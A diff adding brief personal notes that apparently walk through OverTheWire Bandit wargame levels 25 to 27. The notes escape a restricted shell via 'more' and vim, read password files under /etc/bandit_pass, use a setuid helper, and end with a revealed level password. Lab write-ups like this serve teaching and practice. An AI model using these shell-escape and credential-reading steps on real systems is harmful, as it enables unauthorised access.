@@ -1,0 +1,20 @@
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+
+ssh -i bandit26.sshkey bandit26@localhost
+cat /usr/bin/showtext
+
+cat /etc/passwd | grep bandit26
+# uses more command
+# make terminal small
+# type v for vim 
+:e /etc/bandit_pass/bandit26
+
+# to set shell:
+:set shell sh=/bin/bash
+
+# then
+:sh
+
+./bandit27-do cat /etc/bandit_pass/bandit27 
+
+> 3ba3118a22e93127a4ed485be72ef5ea
